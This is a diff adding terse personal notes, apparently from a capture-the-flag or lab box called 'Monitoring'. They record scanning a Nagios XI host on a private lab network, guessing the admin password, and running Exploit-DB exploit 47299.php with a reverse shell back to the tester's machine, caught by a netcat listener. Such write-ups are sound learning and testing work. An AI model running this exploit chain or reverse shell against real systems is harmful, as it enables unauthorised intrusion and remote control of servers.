@@ -1,0 +1,39 @@
+Monitoring
+nmap 
+dirb
+https://192.168.56.124/nagios/
+https://192.168.56.124/nagiosxi/login.php?
+
+Tried login with default username and password nagiosadmin and ngiosadmin but failed
+
+Trying to bruteforce attack against but got faild
+tried some other common password got sucess
+its admin
+
+
+
+ nikto -h http://192.168.56.124
+(no luck)
+
+searchsploit nagios
+locate php/webapps/47299.php
+cp /usr/share/exploitdb/exploits/php/webapps/47299.php .
+php 47299.php
+
+php 47299.php --host=192.168.56.124 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.56.112 --reverseport=1234
+
+I got some error
+
+First Erorr: HP Fatal error:  Uncaught Error: Call to undefined function curl_init()
+solved : sudo apt-get install php-curl
+
+second error: HP Fatal error:  Uncaught Error: Class "DOMDocument"
+sudo apt-get install php-dom
+Third error: cookie.txt already exists - delete prior to running  
+	Solved :  rm cookie.txt 
+	
+	start listening on port 1234
+	nc -nvlp 1234
+	
+
+	
